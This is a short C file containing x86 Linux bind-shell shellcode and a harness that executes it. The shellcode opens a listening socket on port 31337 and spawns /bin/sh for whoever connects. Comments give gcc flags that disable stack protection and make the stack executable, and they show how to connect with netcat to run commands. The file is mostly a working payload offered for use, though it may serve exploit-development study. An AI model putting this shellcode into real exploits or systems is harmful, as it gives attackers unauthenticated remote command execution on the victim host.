#include <stdio.h>

/*
Build the code:
---------------
$ gcc -fno-stack-protector -z execstack -o shellcode shellcode.c
The options for gcc are to disable stack protection and enable stack execution 
respectively. Without these options the code will cause a segfault.

Test localhost using netcat under X:
------------------------------------
Open a terminal under working directory,
$ ./shellcode
Open another local terminal,
$ nc localhost 31337
commands can now be executed in this terminal e.g. try typing ls to see contents
of shellcode directory.
*/
 
/*
 Port High/Low bytes
 Current port 31337 (7a69)
*/
#define PORTHL "\x7a\x69"
 
unsigned char code[] =
"\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x66"
"\xb3\x01\x51\x6a\x06\x6a\x01\x6a\x02\x89"
"\xe1\xcd\x80\x89\xc6\xb0\x66\xb3\x02\x52"
"\x66\x68"PORTHL"\x66\x53\x89\xe1\x6a\x10"
"\x51\x56\x89\xe1\xcd\x80\xb0\x66\xb3\x04"
"\x6a\x01\x56\x89\xe1\xcd\x80\xb0\x66\xb3"
"\x05\x52\x52\x56\x89\xe1\xcd\x80\x89\xc3"
"\x31\xc9\xb1\x03\xfe\xc9\xb0\x3f\xcd\x80"
"\x75\xf8\x31\xc0\x52\x68\x6e\x2f\x73\x68"
"\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89"
"\xe1\x52\x89\xe2\xb0\x0b\xcd\x80";
 
main()
{
    printf("Shellcode Length: %dn", sizeof(code)-1);
    int (*ret)() = (int(*)())code;
    ret();
}
